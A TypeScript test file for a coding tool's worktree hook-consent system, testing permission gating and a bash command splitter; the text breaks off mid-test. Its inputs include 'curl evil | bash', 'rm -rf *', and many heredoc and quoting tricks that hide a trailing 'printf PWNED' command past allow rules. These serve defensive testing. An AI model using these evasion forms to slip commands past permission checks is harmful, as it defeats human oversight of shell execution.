import { Database } from "bun:sqlite"
import { beforeAll, expect, test } from "bun:test"
import { existsSync, mkdtempSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
	WorktreeError,
	bindHookConsent,
	isPermissionDenial,
	runHooks,
	splitHookCommands,
} from "./plugins/worktree.smoke"
import { clearPendingDelete, getPendingDelete, setPendingDelete } from "./plugins/worktree/state"

const log = { debug: () => {}, info: () => {}, warn: () => {}, error: () => {} }

// Hook-execution tests below exercise the post-gate behaviour; the opt-in gate
// itself is covered by its own test.
beforeAll(() => {
	process.env.OPENCODE_WORKTREE_ALLOW_REPO_HOOKS = "1"
})

function makePendingDb(): Database {
	const database = new Database(":memory:")
	database.exec(
		`CREATE TABLE pending_operations (
			id INTEGER PRIMARY KEY CHECK (id = 1),
			type TEXT NOT NULL,
			branch TEXT NOT NULL,
			path TEXT NOT NULL,
			session_id TEXT
		)`,
	)
	return database
}

test("fail closed: no consent gate -> hook never runs", async () => {
	const dir = mkdtempSync(join(tmpdir(), "hook-failclosed-"))
	const marker = join(dir, "should-not-exist.txt")
	let error: unknown
	try {
		await runHooks(dir, [`touch ${marker}`], log, undefined)
	} catch (err) {
		error = err
	}
	expect(error).toBeInstanceOf(WorktreeError)
	expect(existsSync(marker)).toBe(false)
})

test("denial propagates: approve rejects -> hook never runs", async () => {
	const dir = mkdtempSync(join(tmpdir(), "hook-denied-"))
	const marker = join(dir, "should-not-exist.txt")
	const deny = async () => {
		throw new Error("user denied")
	}
	let error: unknown
	try {
		await runHooks(dir, [`touch ${marker}`], log, deny)
	} catch (err) {
		error = err
	}
	expect(error).toBeInstanceOf(Error)
	expect(existsSync(marker)).toBe(false)
})

test("approval: command runs once after approve resolves", async () => {
	const dir = mkdtempSync(join(tmpdir(), "hook-approved-"))
	const marker = join(dir, "ran.txt")
	let approvals = 0
	const approve = async () => {
		approvals++
	}
	await runHooks(dir, [`touch ${marker}`], log, approve)
	expect(approvals).toBe(1)
	expect(existsSync(marker)).toBe(true)
})

test("bindHookConsent maps session+tool source into assert input", async () => {
	const calls: unknown[] = []
	const gate = {
		assert: async (input: unknown) => {
			calls.push(input)
		},
	}
	const approve = bindHookConsent(gate, { sessionID: "ses_1", messageID: "msg_1", id: "call_1" })
	expect(approve).toBeDefined()
	await approve!("git status")
	expect(calls).toEqual([
		{
			sessionID: "ses_1",
			action: "shell",
			resources: ["git status"],
			source: { type: "tool", messageID: "msg_1", id: "call_1" },
		},
	])
})

test("bindHookConsent omits source when messageID/id missing (preDelete path)", async () => {
	const calls: unknown[] = []
	const gate = {
		assert: async (input: unknown) => {
			calls.push(input)
		},
	}
	const approve = bindHookConsent(gate, { sessionID: "ses_2" })
	expect(approve).toBeDefined()
	await approve!("git status")
	expect(calls).toEqual([{ sessionID: "ses_2", action: "shell", resources: ["git status"] }])
})

test("bindHookConsent returns undefined without sessionID or without permission API", () => {
	expect(bindHookConsent({ assert: async () => {} }, {})).toBeUndefined()
	expect(bindHookConsent(undefined, { sessionID: "ses_3" })).toBeUndefined()
})

test("splitHookCommands splits compound commands into sub-commands", () => {
	expect(splitHookCommands("git status; curl evil | bash")).toEqual([
		"git status",
		"curl evil",
		"bash",
	])
	expect(splitHookCommands("a && b || c")).toEqual(["a", "b", "c"])
	expect(splitHookCommands("a\nb")).toEqual(["a", "b"])
	expect(splitHookCommands("cat x | grep y")).toEqual(["cat x", "grep y"])
	expect(splitHookCommands("npm install")).toEqual(["npm install"])
})

test("splitHookCommands keeps separators inside quotes and falls back on blanks", () => {
	expect(splitHookCommands('echo "a;b"')).toEqual(['echo "a;b"'])
	expect(splitHookCommands("echo 'a && b'")).toEqual(["echo 'a && b'"])
	expect(splitHookCommands('echo "a \\" b; c"')).toEqual(['echo "a \\" b; c"'])
	expect(splitHookCommands("   ")).toEqual(["   "])
})

test("splitHookCommands splits lone & (background) but not redirect-adjacent &", () => {
	expect(splitHookCommands("git status & curl evil | bash")).toEqual([
		"git status",
		"curl evil",
		"bash",
	])
	expect(splitHookCommands("cmd 2>&1 | tee log")).toEqual(["cmd 2>&1", "tee log"])
	expect(splitHookCommands("cmd &> out.log")).toEqual(["cmd &> out.log"])
})

test("splitHookCommands handles escaped quotes and # comments conservatively", () => {
	expect(splitHookCommands('echo \\" ; curl evil')).toEqual(['echo \\"', "curl evil"])
	expect(splitHookCommands("echo hi # don't\ncurl evil")).toEqual(["echo hi", "curl evil"])
	expect(splitHookCommands("echo hi # a;b\ncurl evil")).toEqual(["echo hi", "curl evil"])
	// `#` mid-word is not a bash comment, so it must not swallow the `;`.
	expect(splitHookCommands("echo a#b; c")).toEqual(["echo a#b", "c"])
})

test("splitHookCommands keeps escaped whitespace from starting a comment (F1)", () => {
	// bash: `\ ` makes the space a literal word char, so `#` is mid-word, not a comment.
	expect(splitHookCommands("echo \\ # ; curl evil")).toEqual(["echo \\ #", "curl evil"])
})

test("splitHookCommands treats heredoc bodies as data, not commands (F2)", () => {
	expect(
		splitHookCommands("git hash-object --stdin <<EOF\ngit status it's\nEOF\ncurl evil"),
	).toEqual(["git hash-object --stdin <<EOF", "git status it's", "EOF", "curl evil"])
	// Missing terminator: stays conservative (body over-split, never suppressed as a body).
	expect(splitHookCommands("cat <<EOF\nno terminator; curl evil")).toEqual([
		"cat <<EOF",
		"no terminator",
		"curl evil",
	])
	expect(splitHookCommands("cat <<-EOF\n\tbody 'quote\n\tEOF\ncurl evil")).toEqual([
		"cat <<-EOF",
		"body 'quote",
		"EOF",
		"curl evil",
	])
	// Here-strings are not heredocs.
	expect(splitHookCommands('cat <<< "a;b"')).toEqual(['cat <<< "a;b"'])
})

test("splitHookCommands protects bash word-grammar heredoc delimiters (round 4)", () => {
	// Unquoted delimiters may contain any char except whitespace and `;&|<>()` —
	// bash accepts `E!OF`, `E@F`, `E+F`, `E#OF`, `E$F` (no expansion on the word).
	for (const delimiter of ["E!OF", "E@F", "E+F", "E#OF", "E$F"]) {
		const command = `git hash-object --stdin <<${delimiter}\ngit it's x\n${delimiter}\ncurl evil`
		expect(splitHookCommands(command)).toEqual([
			`git hash-object --stdin <<${delimiter}`,
			"git it's x",
			delimiter,
			"curl evil",
		])
	}
	// A word starting with `#` is a comment, not a delimiter; the text stays over-split.
	expect(splitHookCommands("cat <<#x\nbody")).toEqual(["cat <<#x", "body"])
})

test("splitHookCommands keeps backslash heredoc delimiters from merging trailing commands (round 5)", () => {
	const BS = String.fromCharCode(92)
	const NL = String.fromCharCode(10)
	// <<E followed by two backslashes is the delimiter E + one backslash: bash terminates on
	// a raw terminator line and then runs `printf PWNED-B` as its own command, so the
	// splitter must not merge it into the preceding git-prefixed body piece.
	expect(
		splitHookCommands("git hash-object --stdin <<E" + BS + BS + NL + "git it's x" + BS + NL + "E" + BS + NL + "printf PWNED-B"),
	).toEqual(["git hash-object --stdin <<E" + BS + BS, "git it's x" + BS, "E" + BS, "printf PWNED-B"])
	// Same shape with a single-quoted delimiter word (the body stays literal).
	expect(
		splitHookCommands("git hash-object --stdin <<'E" + BS + "'" + NL + "git it's x" + BS + NL + "E" + BS + NL + "printf PWNED-C"),
	).toEqual(["git hash-object --stdin <<'E" + BS + "'", "git it's x" + BS, "E" + BS, "printf PWNED-C"])
	// An escaped backslash inside the word: `<<E` + two backslashes + `OF` is the delimiter
	// E + backslash + O + F, matched by a raw terminator line carrying one backslash.
	expect(
		splitHookCommands("git hash-object --stdin <<E" + BS + BS + "OF" + NL + "git data" + NL + "E" + BS + "OF" + NL + "printf PWNED-W"),
	).toEqual(["git hash-object --stdin <<E" + BS + BS + "OF", "git data", "E" + BS + "OF", "printf PWNED-W"])
	// A backslash-newline continuation inside the word: bash joins the two physical lines and
	// ends up with the delimiter E + O + F + backslash; the trailing printf still stands alone.
	expect(
		splitHookCommands("git hash-object --stdin <<E" + BS + NL + "OF" + BS + BS + NL + "git x " + BS + NL + "EOF" + BS + NL + "printf PWNED-G"),
	).toEqual([
		"git hash-object --stdin <<E" + BS + NL + "OF" + BS + BS,
		"git x " + BS,
		"EOF" + BS,
		"printf PWNED-G",
	])
})

test("splitHookCommands treats backslash continuations inside heredoc bodies as data (round 5)", () => {
	const BS = String.fromCharCode(92)
	const NL = String.fromCharCode(10)
	// A body line ending in backslash splices into the body content only; the raw terminator
	// lines after it and the trailing `printf PWNED-I` (which bash runs as its own command)
	// must surface as separate pieces.
	expect(
		splitHookCommands("git hash-object --stdin <<EOF" + NL + "git inside " + BS + NL + "EOF" + NL + "EOF" + NL + "printf PWNED-I"),
	).toEqual(["git hash-object --stdin <<EOF", "git inside " + BS, "EOF", "EOF", "printf PWNED-I"])
	// A backslash continuation after the terminator joins two physical lines of one bash
	// command, so merging those two lines into one piece matches bash.
	expect(
		splitHookCommands("git hash-object --stdin <<EOF" + NL + "data" + NL + "EOF" + NL + "git commit " + BS + NL + "-m x"),
	).toEqual(["git hash-object --stdin <<EOF", "data", "EOF", "git commit " + BS + NL + "-m x"])
})

test("splitHookCommands honors ANSI-C \\' escapes inside $'…' (F3)", () => {
	expect(splitHookCommands("git $'it\\'s' ; curl evil")).toEqual(["git $'it\\'s'", "curl evil"])
	// `<<` here is a shift, not a heredoc operator.
	expect(splitHookCommands("echo $((1<<2)) ; curl evil")).toEqual(["echo $((1<<2))", "curl evil"])
})

test("splitHookCommands decodes $'…' and $\"…\" heredoc words like bash (round 6)", () => {
	// bash resolves the delimiter word before matching terminator lines: ANSI-C escapes decode,
	// `$"…"` behaves like `"…"`, and unknown escapes keep their backslash.
	const cases: Array<[string, string]> = [
		["$'EOF'", "EOF"],
		['$"EOF"', "EOF"],
		["E$'OF'", "EOF"],
		["$'\\x45OF'", "EOF"],
		["$'\\105OF'", "EOF"],
		["$'\\u0045OF'", "EOF"],
		["$'\\U00000045OF'", "EOF"],
		["$'E\\'OF'", "E'OF"],
		["$'\\z45OF'", "\\z45OF"],
	]
	for (const [word, terminator] of cases) {
		expect(
			splitHookCommands(`git hash-object --stdin <<${word}\ngit it's x\n${terminator}\nprintf PWNED-6a`),
		).toEqual([`git hash-object --stdin <<${word}`, "git it's x", terminator, "printf PWNED-6a"])
	}
})

test("splitHookCommands joins unquoted-word terminator lines like bash (round 6)", () => {
	// Unquoted words: bash removes `\`-newline continuations before comparing a body line, so
	// `E\` + `OF` on two physical lines terminates `<<EOF` and printf surfaces on its own.
	expect(splitHookCommands("cat <<EOF\nE\\\nOF\nprintf PWNED-6b")).toEqual([
		"cat <<EOF",
		"E\\",
		"OF",
		"printf PWNED-6b",
	])
	// A chained continuation swallows the terminator (no body mode); the merge stays inside
	// text bash itself never executes.
	expect(splitHookCommands("cat <<EOF\na\\\nb\\\nEOF\nprintf PWNED-6c")).toEqual([
		"cat <<EOF",
		"a\\\nb\\\nEOF",
		"printf PWNED-6c",
	])
	// `<<-` removes continuations first, then strips tabs from the joined line: `E\` + tab +
	// `OF` is not a terminator, a later plain `EOF` line is, and printf stays separate.
	expect(splitHookCommands("cat <<-EOF\nE\\\n\tOF\nEOF\nprintf PWNED-6d")).toEqual([
		"cat <<-EOF",
		"E\\",
		"OF",
		"EOF",
		"printf PWNED-6d",
	])
	// Quoted words skip the join and match raw after the tab strip.
	expect(splitHookCommands("cat <<-'EOF'\n\tEOF\nprintf PWNED-6e")).toEqual([
		"cat <<-'EOF'",
		"EOF",
		"printf PWNED-6e",
	])
	// The same tab-indented line does not terminate an unquoted `<<-EOF` after a continuation.
	expect(splitHookCommands("cat <<-EOF\nx\\\n\tEOF\nprintf PWNED-6f")).toEqual([
		"cat <<-EOF",
		"x\\\n\tEOF",
		"printf PWNED-6f",
	])
})

test("splitHookCommands keeps empty quoted heredoc delimiters protected (round 6)", () => {
	// bash accepts `<<''` / `<<$''` and terminates on an empty line; the quote-bearing body line
	// must stay gated so the executed printf is not merged into a `cat`-prefixed piece.
	expect(splitHookCommands("cat <<''\ncat it's\n\nprintf PWNED-6g")).toEqual([
		"cat <<''",
		"cat it's",
		"printf PWNED-6g",
	])
	expect(splitHookCommands("cat <<$''\nx\n\nprintf PWNED-6h")).toEqual([
		"cat <<$''",
		"x",
		"printf PWNED-6h",
	])
})

test("splitHookCommands splits commands bash runs after quoted heredocs (round 6 vectors)", () => {
	// D9 shape: the `cat`-prefixed body line would match a `cat *` allow rule, so the executed
	// printf after the terminator must be its own piece.
	expect(splitHookCommands("cat <<$'EOF'\ncat it's\nEOF\nprintf PWNED-6i")).toEqual([
		"cat <<$'EOF'",
		"cat it's",
		"EOF",
		"printf PWNED-6i",
	])
	// D10 shape: the join-aware terminator search must not stop at the `cat body\` + `pwd` join.
	expect(splitHookCommands("cat <<pwd\ncat body\\\npwd\ncat it's\npwd\nprintf PWNED-6j")).toEqual([
		"cat <<pwd",
		"cat body\\",
		"pwd",
		"cat it's",
		"pwd",
		"printf PWNED-6j",
	])
	// `$` inside a single-quoted word is literal, and the executed printf stays separate.
	expect(
		splitHookCommands("git hash-object --stdin <<'$EOF'\ngit it's x\n$EOF\nprintf PWNED-6k"),
	).toEqual(["git hash-object --stdin <<'$EOF'", "git it's x", "$EOF", "printf PWNED-6k"])
	// `"…"` keeps a backslash before non-special chars, so `E"a\qb"` terminates on `Ea\qb`.
	expect(
		splitHookCommands('git hash-object --stdin <<E"a\\qb"\ngit it\'s x\nEa\\qb\nprintf PWNED-6l'),
	).toEqual(['git hash-object --stdin <<E"a\\qb"', "git it's x", "Ea\\qb", "printf PWNED-6l"])
})

test("splitHookCommands splits commands bash runs after substitution heredoc words (round 7)", () => {
	// bash never executes the substitution in a delimiter word: the literal source is the
	// delimiter and the word stays unquoted, so the `cat`-prefixed body line must stay gated
	// and the printf after the terminator must be its own piece.
	expect(splitHookCommands("cat <<$(echo EOF)\ncat it's\n$(echo EOF)\nprintf PWNED-7a")).toEqual([
		"cat <<$(echo EOF)",
		"cat it's",
		"$(echo EOF)",
		"printf PWNED-7a",
	])
	// Inner quotes are literal text: the terminator is the full source line, not a stripped one.
	expect(
		splitHookCommands("cat <<$(echo 'EOF')\ncat it's\n$(echo 'EOF')\nprintf PWNED-7b"),
	).toEqual(["cat <<$(echo 'EOF')", "cat it's", "$(echo 'EOF')", "printf PWNED-7b"])
	// Unquoted word: the join rule applies, so `$(ech\` + `o EOF)` terminates and printf runs.
	expect(
		splitHookCommands("cat <<$(echo EOF)\nz\n$(ech\\\no EOF)\nprintf PWNED-7c"),
	).toEqual(["cat <<$(echo EOF)", "z", "$(ech\\", "o EOF)", "printf PWNED-7c"])
})

test("splitHookCommands splits commands bash runs after backtick heredoc words (round 7)", () => {
	// Backticks follow the same literal-source rule; the executed printf stays separate.
	expect(splitHookCommands("cat <<`echo EOF`\ncat it's\n`echo EOF`\nprintf PWNED-7d")).toEqual([
		"cat <<`echo EOF`",
		"cat it's",
		"`echo EOF`",
		"printf PWNED-7d",
	])
	// The chunk can sit inside a larger word (`E`echo OF``).
	expect(splitHookCommands("cat <<E`echo OF`\ncat it's\nE`echo OF`\nprintf PWNED-7e")).toEqual([
		"cat <<E`echo OF`",
		"cat it's",
		"E`echo OF`",
		"printf PWNED-7e",
	])
})

test("splitHookCommands models nested and literal $ forms in heredoc words (round 7)", () => {
	// Nested `$(…)` is captured verbatim.
	expect(
		splitHookCommands("cat <<$(echo $(echo EOF))\ncat it's\n$(echo $(echo EOF))\nprintf PWNED-7f"),
	).toEqual(["cat <<$(echo $(echo EOF))", "cat it's", "$(echo $(echo EOF))", "printf PWNED-7f"])
	// `$((…))` is arithmetic syntax, not a substitution: the word is literal and unexpanded.
	expect(splitHookCommands("cat <<$((1+1))\ncat it's\n$((1+1))\nprintf PWNED-7g")).toEqual([
		"cat <<$((1+1))",
		"cat it's",
		"$((1+1))",
		"printf PWNED-7g",
	])
	// Spaces inside the substitution stay part of the delimiter.
	expect(splitHookCommands("cat <<$(echo EO F)\ncat it's\n$(echo EO F)\nprintf PWNED-7h")).toEqual([
		"cat <<$(echo EO F)",
		"cat it's",
		"$(echo EO F)",
		"printf PWNED-7h",
	])
	// Negative: the quote-stripped spelling is not the terminator, so no body mode engages —
	// the fallback still emits the printf as its own piece (bash runs nothing there anyway).
	expect(splitHookCommands("cat <<$(echo 'EOF')\nx\n$(echo EOF)\nprintf PWNED-7p")).toEqual([
		"cat <<$(echo 'EOF')",
		"x",
		"$(echo EOF)",
		"printf PWNED-7p",
	])
})

test("splitHookCommands keeps ${x}/$x literal in heredoc words (round 7)", () => {
	// No parameter expansion happens in a delimiter word: `${x}` and `$x` are literal text.
	expect(splitHookCommands("x=EOF\ncat <<${x}\ncat it's\n${x}\nprintf PWNED-7i")).toEqual([
		"x=EOF",
		"cat <<${x}",
		"cat it's",
		"${x}",
		"printf PWNED-7i",
	])
	expect(splitHookCommands("x=EOF\ncat <<$x\ncat it's\n$x\nprintf PWNED-7j")).toEqual([
		"x=EOF",
		"cat <<$x",
		"cat it's",
		"$x",
		"printf PWNED-7j",
	])
})

test("splitHookCommands strips tabs for <<- substitution words (round 7)", () => {
	// `<<-` strips leading tabs before the exact compare, so the tab-indented source line
	// terminates and the executed printf is its own piece.
	expect(
		splitHookCommands("cat <<-$(echo EOF)\ncat it's\n\t$(echo EOF)\nprintf PWNED-7k"),
	).toEqual(["cat <<-$(echo EOF)", "cat it's", "$(echo EOF)", "printf PWNED-7k"])
})

test("splitHookCommands models double-quoted substitution words like bash (round 7)", () => {
	// Inside `"…"` the substitution sits in a double-quote context: inner `"…"` loses its
	// quotes (bash's resolved delimiter is `$(echo x)`), and the word is quoted → raw matching.
	expect(splitHookCommands('cat <<"$(echo "x")"\ncat it\'s\n$(echo x)\nprintf PWNED-7l')).toEqual([
		'cat <<"$(echo "x")"',
		"cat it's",
		"$(echo x)",
		"printf PWNED-7l",
	])
	// Inner single quotes are kept (probed): the terminator keeps them too.
	expect(splitHookCommands('cat <<"$(echo \'x\')"\ncat it\'s\n$(echo \'x\')\nprintf PWNED-7m')).toEqual(
		['cat <<"$(echo \'x\')"', "cat it's", "$(echo 'x')", "printf PWNED-7m"],
	)
	// Negative: with the quotes kept, the quote-stripped spelling is not the terminator.
	expect(splitHookCommands('cat <<"$(echo \'x\')"\nx\n$(echo x)\nprintf PWNED-7m2')).toEqual([
		'cat <<"$(echo \'x\')"',
		"x",
		"$(echo x)",
		"printf PWNED-7m2",
	])
	// Backticks inside `"…"`: backticks kept, inner `"…"` quotes removed.
	expect(splitHookCommands('cat <<"`echo "x"`"\ncat it\'s\n`echo x`\nprintf PWNED-7n')).toEqual([
		'cat <<"`echo "x"`"',
		"cat it's",
		"`echo x`",
		"printf PWNED-7n",
	])
	// Quoted word: the join rule does not apply, so no body mode engages — the fallback keeps
	// the executed-looking printf separate (bash itself never terminates this heredoc).
	expect(splitHookCommands('cat <<"$(echo EOF)"\nz\n$(ech\\\no EOF)\nprintf PWNED-7o')).toEqual([
		'cat <<"$(echo EOF)"',
		"z",
		"$(ech\\\no EOF)",
		"printf PWNED-7o",
	])
})

test("splitHookCommands truncates $'…' heredoc words at a decoded NUL (round 9)", () => {
	// bash resolves each `$'…'` chunk as a C string: a decoded NUL ends the chunk, while
	// chunks and plain chars after it keep appending to the word. Ground-truthed per escape.
	expect(splitHookCommands("cat <<$'E\\0OF'\ncat it's\nE\nprintf PWNED-9a")).toEqual([
		"cat <<$'E\\0OF'",
		"cat it's",
		"E",
		"printf PWNED-9a",
	])
	// A NUL in the first chunk leaves the delimiter empty: it terminates on an empty line.
	for (const header of ["cat <<$'\\x00EOF'", "cat <<$'\\u0000EOF'", "cat <<$'\\U00000000EOF'"]) {
		expect(splitHookCommands(header + "\ncat it's\n\nprintf PWNED-9b")).toEqual([
			header,
			"cat it's",
			"printf PWNED-9b",
		])
	}
	// `\c@` also decodes to NUL; several NUL escapes in one chunk stop at the first.
	expect(splitHookCommands("cat <<$'E\\c@OF'\ncat it's\nE\nprintf PWNED-9c")).toEqual([
		"cat <<$'E\\c@OF'",
		"cat it's",
		"E",
		"printf PWNED-9c",
	])
	expect(splitHookCommands("cat <<$'E\\0\\x00OF'\ncat it's\nE\nprintf PWNED-9n")).toEqual([
		"cat <<$'E\\0\\x00OF'",
		"cat it's",
		"E",
		"printf PWNED-9n",
	])
	// The NUL only truncates its chunk: `XE$'\0OF'` is `XE`, `$'E\0OF'Y` is `EY`, and a
	// trailing NUL leaves the decoded word intact (`$'EOF\0'` is `EOF`).
	expect(splitHookCommands("cat <<XE$'\\0OF'\ncat it's\nXE\nprintf PWNED-9d")).toEqual([
		"cat <<XE$'\\0OF'",
		"cat it's",
		"XE",
		"printf PWNED-9d",
	])
	expect(splitHookCommands("cat <<$'E\\0OF'Y\ncat it's\nEY\nprintf PWNED-9e")).toEqual([
		"cat <<$'E\\0OF'Y",
		"cat it's",
		"EY",
		"printf PWNED-9e",
	])
	expect(splitHookCommands("cat <<$'EOF\\0'\ncat it's\nEOF\nprintf PWNED-9f")).toEqual([
		"cat <<$'EOF\\0'",
		"cat it's",
		"EOF",
		"printf PWNED-9f",
	])
	// Negative: the untruncated spelling is body text (the `EOF` line is data), the `E` line
	// terminates, and the executed printf still surfaces as its own piece.
	expect(splitHookCommands("cat <<$'E\\0OF'\nEOF\nE\nprintf PWNED-9g")).toEqual([
		"cat <<$'E\\0OF'",
		"EOF",
		"E",
		"printf PWNED-9g",
	])
})

test("splitHookCommands keeps CR/VT/FF/NBSP/U+2028 in heredoc words (round 9)", () => {
	// bash ends a delimiter word only at blank, newline or `;&|<>()`: every other char —
	// including chars a JS `\s` test matches — stays in the word and in the terminator line.
	const CR = String.fromCharCode(13)
	const cases: Array<[string, string, string, string]> = [
		// [delimiter word, body line, header piece, terminator piece]
		["EOF" + CR, "cat it's" + CR, "cat <<EOF", "EOF"],
		["E\u000bOF", "cat it's", "cat <<E\u000bOF", "E\u000bOF"],
		["E\fOF", "cat it's", "cat <<E\fOF", "E\fOF"],
		["E\u00a0OF", "cat it's", "cat <<E\u00a0OF", "E\u00a0OF"],
		["E\u2028OF", "cat it's", "cat <<E\u2028OF", "E\u2028OF"],
		["E\u2029OF", "cat it's", "cat <<E\u2029OF", "E\u2029OF"],
		["EOF" + CR + "X", "cat it's", "cat <<EOF" + CR + "X", "EOF" + CR + "X"],
	]
	for (const [delimiter, body, header, terminator] of cases) {
		expect(
			splitHookCommands("cat <<" + delimiter + "\n" + body + "\n" + delimiter + "\nprintf PWNED-9h"),
		).toEqual([header, body.trim(), terminator, "printf PWNED-9h"])
	}
	// Negative: the CR lives in the delimiter word, so the LF-only `EOF` line is not a
	// terminator and bash runs nothing there; the fallback merge stays over that dead text.
	expect(splitHookCommands("cat <<EOF\r\ncat it's\nEOF\nprintf PWNED-9i")).toEqual([
		"cat <<EOF",
		"cat it's\nEOF\nprintf PWNED-9i",
	])
})

test("splitHookCommands ends heredoc words at parens like bash (round 9)", () => {
	// `(`/`)` are word-ending metacharacters: `(cat <<EOF)` is valid bash and the printf
	// after the terminator must stay its own piece.
	expect(splitHookCommands("(cat <<EOF)\ncat it's\nEOF\nprintf PWNED-9j")).toEqual([
		"(cat <<EOF)",
		"cat it's",
		"EOF",
		"printf PWNED-9j",
	])
	// `<<EOF)` is a bash syntax error (nothing executes); reading the word as `EOF` only
	// over-splits that dead text.
	expect(splitHookCommands("cat <<EOF)\ncat it's\nEOF\nprintf PWNED-9k")).toEqual([
		"cat <<EOF)",
		"cat it's",
		"EOF",
		"printf PWNED-9k",
	])
})

test("splitHookCommands does not start comments after CR/VT (round 9)", () => {
	// bash: CR and VT are ordinary word chars, so `#` after them is mid-word and the `;`
	// still splits — `cat\r#; printf PWNED` runs the printf.
	expect(splitHookCommands("cat\r#; printf PWNED-9l")).toEqual(["cat\r#", "printf PWNED-9l"])
	expect(splitHookCommands("cat\u000b#; printf PWNED-9m")).toEqual(["cat\u000b#", "printf PWNED-9m"])
	// A `#` after a real blank is still a comment.
	expect(splitHookCommands("echo hi # don't\ncurl evil")).toEqual(["echo hi", "curl evil"])
})

test("bindHookConsent asserts one resource per sub-command", async () => {
	const calls: unknown[] = []
	const gate = {
		assert: async (input: unknown) => {
			calls.push(input)
		},
	}
	const approve = bindHookConsent(gate, { sessionID: "ses_4" })
	await approve!("git status; curl evil | bash")
	expect(calls).toEqual([
		{ sessionID: "ses_4", action: "shell", resources: ["git status", "curl evil", "bash"] },
	])
})

test("isPermissionDenial matches tagged denials (incl. Tool.Error wrapper) only", () => {
	expect(isPermissionDenial({ _tag: "Permission.DeclinedError" })).toBe(true)
	expect(isPermissionDenial({ _tag: "Permission.BlockedError" })).toBe(true)
	expect(isPermissionDenial({ _tag: "Tool.Error", error: { _tag: "Permission.DeclinedError" } })).toBe(
		true,
	)
	expect(isPermissionDenial({ _tag: "Tool.Error" })).toBe(false)
	expect(isPermissionDenial(new Error("boom"))).toBe(false)
	expect(isPermissionDenial(undefined)).toBe(false)
})

test("repo hooks are disabled unless the operator opts in", async () => {
	const saved = process.env.OPENCODE_WORKTREE_ALLOW_REPO_HOOKS
	delete process.env.OPENCODE_WORKTREE_ALLOW_REPO_HOOKS
	const dir = mkdtempSync(join(tmpdir(), "hook-gate-"))
	const marker = join(dir, "should-not-exist.txt")
	let error: unknown
	try {
		await runHooks(dir, [`touch ${marker}`], log, async () => {})
	} catch (err) {
		error = err
	} finally {
		if (saved === undefined) delete process.env.OPENCODE_WORKTREE_ALLOW_REPO_HOOKS
		else process.env.OPENCODE_WORKTREE_ALLOW_REPO_HOOKS = saved
	}
	expect(error).toBeInstanceOf(WorktreeError)
	expect(String(error)).toContain("Repo hook execution is disabled")
	expect(existsSync(marker)).toBe(false)
})

test("pending delete is scoped to the session that requested it", () => {
	const database = makePendingDb()
	setPendingDelete(database, { branch: "feat-x", path: "/tmp/wt", sessionId: "ses_owner" })

	// Another session going idle must not consume (and delete) this worktree.
	expect(getPendingDelete(database, "ses_other")).toBeNull()
	expect(getPendingDelete(database, "ses_owner")).toEqual({
		branch: "feat-x",
		path: "/tmp/wt",
		sessionId: "ses_owner",
	})

	// Rows written before session scoping never match a scoped lookup.
	database.exec("UPDATE pending_operations SET session_id = NULL")
	expect(getPendingDelete(database, "ses_owner")).toBeNull()
	database.close()
})

test("preDelete denial keeps the worktree and clears the pending delete (simulated handler catch)", async () => {
	const database = makePendingDb()
	setPendingDelete(database, {
		branch: "feat-x",
		path: "/tmp/worktree-kept",
		sessionId: "ses_owner",
	})
	expect(getPendingDelete(database)).toEqual({
		branch: "feat-x",
		path: "/tmp/worktree-kept",
		sessionId: "ses_owner",
	})

	const dir = mkdtempSync(join(tmpdir(), "hook-predelete-"))
	const deny = async () => {
		throw { _tag: "Permission.DeclinedError" }
	}
	let error: unknown
	try {
		await runHooks(dir, ["rm -rf *"], log, deny)
	} catch (err) {
		error = err
	}

	expect(isPermissionDenial(error)).toBe(true)
	// Mirrors the session.idle catch: denial is terminal for this attempt, so clear the row.
	if (isPermissionDenial(error)) clearPendingDelete(database)
	expect(getPendingDelete(database)).toBeNull()
	expect(existsSync(dir)).toBe(true)
	database.close()
})

test("postCreate failure surfaces the worktree path and preserves the cause (simulated wrap)", async () => {
	const dir = mkdtempSync(join(tmpdir(), "hook-postcreate-"))
	const deny = async () => {
		throw new Error("user denied")
	}
	let error: unknown
	try {
		await runHooks(dir, ["rm -rf *"], log, deny)
	} catch (err) {
		error = err
	}

	// Mirrors the worktree_create postCreate catch: no cleanup, message must point at the worktree.
	const wrapped = new WorktreeError(
		`${error instanceof Error ? error.message : String(error)}\nWorktree created at ${dir}. Verify hook settings and retry.`,
		"postCreate hooks",
		error,
	)
	expect(wrapped.operation).toBe("postCreate hooks")
	expect(wrapped.cause).toBe(error)
	expect(wrapped.message).toContain(dir)
	expect(wrapped.message).toContain("user denied")
})

test("splitHookCommands keeps substitution-newline heredoc words from merging commands (round 10)", () => {
	// A newline inside a `$(…)`/backtick span is command text: bash starts the body only after
	// the closing `)`, so the trigger must not fire there. Ground-truthed per vector; without
	// the gate a phantom terminator cut the real body short and the payload merged into the
	// `cat …` piece (SILENT in the pre-fix differential).
	expect(splitHookCommands('cat <<"cat x)" $(echo\ncat x)\ncat it\'s\ncat x)\nprintf PWNED-10a')).toEqual([
		'cat <<"cat x)" $(echo',
		"cat x)",
		"cat it's",
		"cat x)",
		"printf PWNED-10a",
	])
	// Backtick span: the closing backtick must not be re-read as a new opening.
	expect(splitHookCommands('cat <<"cat x)" `echo\ncat x`\ncat it\'s\ncat x)\nprintf PWNED-10b')).toEqual([
		'cat <<"cat x)" `echo',
		"cat x`",
		"cat it's",
		"cat x)",
		"printf PWNED-10b",
	])
	expect(splitHookCommands('cat <<"pwd)" $(echo\npwd)\ncat it\'s\npwd)\nprintf PWNED-10c')).toEqual([
		'cat <<"pwd)" $(echo',
		"pwd)",
		"cat it's",
		"pwd)",
		"printf PWNED-10c",
	])
	// Negative: no substitution — bash syntax-errors at EOF, everything after is dead text,
	// so the line-wise fallback merge stays accepted.
	expect(splitHookCommands('cat <<"cat x)" x\ncat x)\ncat it\'s\ncat x)\nprintf PWNED-10d')).toEqual([
		'cat <<"cat x)" x',
		"cat x)",
		"cat it's\ncat x)\nprintf PWNED-10d",
	])
})

test("splitHookCommands keeps a bare \\c before the closing quote literal (round 10)", () => {
	// bash needs a char after `\c`, so `$'\c'` is the two chars `\c` and the quote still closes
	// the chunk; the terminator line must spell `\c` (probed LIVE). Before this round the quote
	// was consumed as BEL, ran the chunk into later text and the payload merged (SILENT in the
	// pre-fix differential).
	expect(splitHookCommands("cat <<$'\\c'\ncat it's\n\\c\nprintf PWNED-10e")).toEqual([
		"cat <<$'\\c'",
		"cat it's",
		"\\c",
		"printf PWNED-10e",
	])
	expect(splitHookCommands("cat <<$'\\c'X\ncat it's\n\\cX\nprintf PWNED-10f")).toEqual([
